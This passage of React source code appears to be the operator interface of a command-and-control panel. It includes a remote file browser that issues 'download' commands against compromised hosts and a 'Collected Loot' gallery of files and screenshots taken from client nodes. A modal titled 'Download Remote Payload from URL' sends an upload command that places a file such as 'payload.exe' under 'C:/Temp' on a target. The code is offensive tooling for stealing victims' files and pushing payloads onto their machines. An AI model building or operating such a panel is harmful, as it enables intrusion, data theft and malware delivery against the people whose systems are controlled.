                                        onClick={() => executeCommand(`download "${fullPath}"`)}
                                        className="p-1.5 hover:bg-c2accent/20 hover:text-c2cyan text-slate-400 rounded-lg transition-colors"
                                      >
                                        <Download className="w-3.5 h-3.5" />
                                      </button>
                                    </Tooltip>
                                    <Tooltip text="Copy Remote Path" position="left">
                                      <button
                                        onClick={() => {
                                          navigator.clipboard.writeText(fullPath);
                                        }}
                                        className="p-1.5 hover:bg-slate-700 hover:text-white text-slate-400 rounded-lg transition-colors"
                                      >
                                        <Copy className="w-3.5 h-3.5" />
                                      </button>
                                    </Tooltip>
                                  </div>
                                )}
                              </td>
                            </tr>
                          );
                        })}
                      </tbody>
                    </table>
                  ) : (
                    /* ================= GRID / CARD VIEW ================= */
                    <div className="p-4 grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 xl:grid-cols-6 gap-3">
                      {filteredAndSortedFiles.map((file, i) => {
                        const meta = getFileMeta(file);
                        const fullPath = buildFullPath(currentPath, file.name);
                        const isSelected = selectedPaths.has(fullPath);
                        const badge = getFileTypeBadge(file.name, file.is_dir);

                        return (
                          <div
                            key={i}
                            onClick={(e) => toggleSelect(fullPath, e)}
                            onDoubleClick={() => {
                              if (file.is_dir) browseFolder(fullPath);
                              else if (meta.isPreviewable) requestPreview(fullPath, file.name);
                            }}
                            className={`p-3 rounded-xl border transition-all cursor-pointer flex flex-col justify-between group relative ${
                              isSelected
                                ? 'bg-c2accent/15 border-c2accent ring-1 ring-c2accent/40 shadow-md'
                                : 'bg-c2pill/60 hover:bg-c2pill border-c2border hover:border-c2borderlight'
                            }`}
                          >
                            <div className="flex items-start justify-between">
                              <div className="p-2 rounded-lg bg-c2bg border border-c2border group-hover:border-c2borderlight transition-colors">
                                {meta.icon}
                              </div>
                              <span className={`px-1.5 py-0.5 rounded text-[8px] font-mono border ${badge.color}`}>
                                {badge.label}
                              </span>
                            </div>

                            <div className="my-2 min-w-0">
                              <div className="text-xs font-semibold text-white truncate" title={file.name}>
                                {file.name}
                              </div>
                              <div className="text-[10px] font-mono text-slate-500 mt-0.5">
                                {file.is_dir ? 'Folder' : formatFileSize(file.size)}
                              </div>
                            </div>

                            {/* Quick Action Overlay */}
                            <div className="pt-2 border-t border-c2border/50 flex items-center justify-between opacity-70 group-hover:opacity-100 transition-opacity">
                              <span className="text-[9px] font-mono text-slate-500 truncate">{file.date || ''}</span>
                              {!file.is_dir && (
                                <div className="flex items-center space-x-1">
                                  {meta.isPreviewable && (
                                    <button
                                      onClick={(e) => { e.stopPropagation(); requestPreview(fullPath, file.name); }}
                                      className="p-1 hover:bg-emerald-500/20 text-slate-400 hover:text-emerald-400 rounded"
                                    >
                                      <Eye className="w-3 h-3" />
                                    </button>
                                  )}
                                  <button
                                    onClick={(e) => { e.stopPropagation(); executeCommand(`download "${fullPath}"`); }}
                                    className="p-1 hover:bg-c2accent/20 text-slate-400 hover:text-c2cyan rounded"
                                  >
                                    <Download className="w-3 h-3" />
                                  </button>
                                </div>
                              )}
                            </div>
                          </div>
                        );
                      })}
                    </div>
                  )}
                </div>

                {/* Footer Status Bar */}
                <div className="px-4 py-2 border-t border-c2border bg-c2pill/60 text-[11px] text-slate-400 flex items-center justify-between shrink-0 font-mono">
                  <div className="flex items-center space-x-3">
                    <span>{filteredAndSortedFiles.length} item{filteredAndSortedFiles.length !== 1 ? 's' : ''}</span>
                    {searchQuery && (
                      <span className="text-slate-500">(filtered from {fileList.length})</span>
                    )}
                    {selectedPaths.size > 0 && (
                      <span className="text-c2cyan font-bold">• {selectedPaths.size} selected</span>
                    )}
                  </div>
                  <div className="flex items-center space-x-2 text-slate-500">
                    <span>Double-click to open/preview</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        ) : (
          /* ================= LOOT GALLERY ================= */
          <div className="h-full bg-c2card border border-c2border rounded-2xl overflow-hidden flex shadow-card">
            {/* Loot List Sidebar */}
            <div className="w-80 border-r border-c2border flex flex-col bg-c2bg/40 shrink-0">
              <div className="p-3.5 border-b border-c2border space-y-2">
                <div className="flex items-center justify-between">
                  <span className="text-xs font-bold text-white uppercase tracking-wider">Collected Loot</span>
                  <span className="px-2 py-0.5 rounded-full text-[10px] font-mono bg-c2pill text-c2cyan border border-c2border">
                    {lootFiles.length} files
                  </span>
                </div>
                <div className="relative">
                  <Search className="w-3 h-3 text-slate-500 absolute left-2.5 top-1/2 -translate-y-1/2" />
                  <input
                    type="text"
                    value={lootSearchQuery}
                    onChange={(e) => setLootSearchQuery(e.target.value)}
                    placeholder="Filter loot..."
                    className="w-full bg-c2pill border border-c2border rounded-lg pl-7 pr-2 py-1 text-[11px] text-white placeholder-slate-500 focus:outline-none focus:border-c2accent"
                  />
                </div>
              </div>

              <div className="flex-1 overflow-y-auto p-2 space-y-1">
                {filteredLootFiles.length === 0 ? (
                  <div className="p-8 text-center text-slate-600 text-xs italic">
                    No loot collected yet. Use "Download" on files or run "screenshot" to capture files.
                  </div>
                ) : (
                  filteredLootFiles.map((file, i) => {
                    const isSelected = selectedLoot?.path === file.path;
                    const isImage = file.name.match(/\.(png|jpg|jpeg|gif|webp)$/i);
                    return (
                      <div
                        key={i}
                        onClick={() => viewLoot(file)}
                        className={`p-3 rounded-xl border cursor-pointer transition-all ${
                          isSelected
                            ? 'bg-c2accent/15 border-c2accent shadow-sm'
                            : 'bg-c2pill/50 hover:bg-c2pill border-c2border/60'
                        }`}
                      >
                        <div className="flex items-center space-x-2.5">
                          <div className="p-1.5 rounded-lg bg-c2bg border border-c2border shrink-0">
                            {isImage ? <ImageIcon className="w-4 h-4 text-emerald-400" /> : <FileText className="w-4 h-4 text-sky-400" />}
                          </div>
                          <div className="min-w-0 flex-1">
                            <div className="text-xs font-bold text-slate-200 truncate">{file.name}</div>
                            <div className="flex items-center justify-between text-[10px] text-slate-500 font-mono mt-1">
                              <span className="text-slate-400">{file.client}</span>
                              <span>{Math.round(file.size / 1024)} KB</span>
                            </div>
                          </div>
                        </div>
                      </div>
                    );
                  })
                )}
              </div>
            </div>

            {/* Loot Preview Pane */}
            <div className="flex-1 bg-c2bg/60 flex flex-col relative overflow-hidden">
              {selectedLoot ? (
                <>
                  <div className="p-3.5 border-b border-c2border bg-c2card flex items-center justify-between shrink-0">
                    <div className="flex items-center space-x-3 min-w-0">
                      <div className="text-xs font-mono font-bold text-c2cyan bg-c2accent/10 px-2.5 py-1 rounded-lg border border-c2accent/20 truncate">
                        {selectedLoot.name}
                      </div>
                      <span className="text-[11px] text-slate-400 font-mono">
                        {Math.round(selectedLoot.size / 1024)} KB • From node {selectedLoot.client}
                      </span>
                    </div>
                    <div className="flex items-center space-x-2">
                      <button
                        onClick={() => {
                          const link = document.createElement('a');
                          link.href = `data:application/octet-stream;base64,${lootContent}`;
                          link.download = selectedLoot.name;
                          link.click();
                        }}
                        className="px-3 py-1.5 bg-c2accent hover:bg-c2accenthover text-white rounded-lg text-xs font-bold flex items-center space-x-1.5 transition-colors shadow-sm"
                      >
                        <Download className="w-3.5 h-3.5" />
                        <span>Save to Disk</span>
                      </button>
                    </div>
                  </div>

                  <div className="flex-1 overflow-auto p-6 flex items-center justify-center">
                    {selectedLoot.name.match(/\.(png|jpg|jpeg|gif|webp)$/i) ? (
                      lootContent ? (
                        <img
                          src={`data:image/png;base64,${lootContent}`}
                          alt="Loot Preview"
                          className="max-w-full max-h-full object-contain rounded-xl border border-c2border shadow-2xl"
                        />
                      ) : (
                        <div className="text-slate-500 flex flex-col items-center space-y-3">
                          <RefreshCw className="w-6 h-6 animate-spin text-c2cyan" />
                          <span className="text-xs font-bold uppercase tracking-wider">Decoding Image...</span>
                        </div>
                      )
                    ) : (
                      <div className="w-full h-full bg-c2card rounded-xl border border-c2border overflow-hidden flex flex-col shadow-inner">
                        <div className="p-2.5 bg-c2pill border-b border-c2border text-[10px] font-mono text-slate-400 uppercase tracking-wider px-4 flex items-center justify-between">
                          <span>Raw File Contents</span>
                          <button
                            onClick={() => {
                              try {
                                const decoded = atob(lootContent || '');
                                navigator.clipboard.writeText(decoded);
                              } catch { }
                            }}
                            className="text-c2cyan hover:text-white text-[10px] flex items-center space-x-1"
                          >
                            <Copy className="w-3 h-3" />
                            <span>Copy Text</span>
                          </button>
                        </div>
                        <pre className="flex-1 text-xs font-mono text-slate-300 p-5 overflow-auto whitespace-pre-wrap leading-relaxed">
                          {lootContent ? (() => {
                            try {
                              const decoded = atob(lootContent);
                              const hasNonPrintable = /[\x00-\x08\x0E-\x1F]/.test(decoded);
                              if (hasNonPrintable) return '[Binary content — click Save to Disk to export]';
                              return decoded;
                            } catch {
                              return '[Unable to decode base64 content]';
                            }
                          })() : 'Loading content...'}
                        </pre>
                      </div>
                    )}
                  </div>
                </>
              ) : (
                <div className="flex-1 flex flex-col items-center justify-center text-slate-600 space-y-3">
                  <div className="w-16 h-16 rounded-2xl bg-c2pill flex items-center justify-center border border-c2border/50">
                    <Archive className="w-8 h-8 opacity-20 text-c2cyan" />
                  </div>
                  <span className="text-xs font-bold uppercase tracking-widest opacity-50">Select a collected loot file to inspect</span>
                </div>
              )}
            </div>
          </div>
        )}
      </div>

      {/* Push / Upload from URL Modal */}
      {uploadModalOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm">
          <div className="bg-c2card border border-c2border rounded-2xl shadow-2xl p-5 w-[480px] space-y-4">
            <div className="flex items-center justify-between border-b border-c2border pb-3">
              <div className="flex items-center space-x-2">
                <Upload className="w-4 h-4 text-c2cyan" />
                <h3 className="text-xs font-bold text-white uppercase tracking-wider">Download Remote Payload from URL</h3>
              </div>
              <button onClick={() => setUploadModalOpen(false)} className="text-slate-400 hover:text-white">
                <X className="w-4 h-4" />
              </button>
            </div>

            <div className="space-y-3">
              <div>
                <label className="text-[10px] font-bold uppercase tracking-wider text-slate-400">Direct Download URL</label>
                <input
                  type="text"
                  value={uploadUrl}
                  onChange={(e) => setUploadUrl(e.target.value)}
                  placeholder="https://example.com/payload.exe"
                  className="mt-1 w-full bg-c2pill border border-c2border rounded-lg px-3 py-2 text-xs font-mono text-white focus:outline-none focus:border-c2accent"
                />
              </div>
              <div>
                <label className="text-[10px] font-bold uppercase tracking-wider text-slate-400">Destination File Path on Target</label>
                <input
                  type="text"
                  value={uploadDst}
                  onChange={(e) => setUploadDst(e.target.value)}
                  placeholder="C:/Temp/payload.exe"
                  className="mt-1 w-full bg-c2pill border border-c2border rounded-lg px-3 py-2 text-xs font-mono text-white focus:outline-none focus:border-c2accent"
                />
              </div>
            </div>

            <div className="flex items-center justify-end space-x-2 pt-2 border-t border-c2border">
              <button
                onClick={() => setUploadModalOpen(false)}
                className="px-3 py-1.5 rounded-lg text-xs font-semibold text-slate-400 hover:text-white"
              >
                Cancel
              </button>
              <button
                onClick={() => {
                  if (uploadUrl && uploadDst) {
                    executeCommand(`upload ${uploadUrl} ${uploadDst}`);
                    setUploadModalOpen(false);
                    setUploadUrl('');
                  }
                }}
                disabled={!uploadUrl || !uploadDst}
                className="px-4 py-1.5 bg-c2accent hover:bg-c2accenthover disabled:opacity-40 text-white rounded-lg text-xs font-bold transition-colors"
              >
                Execute Remote Download
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
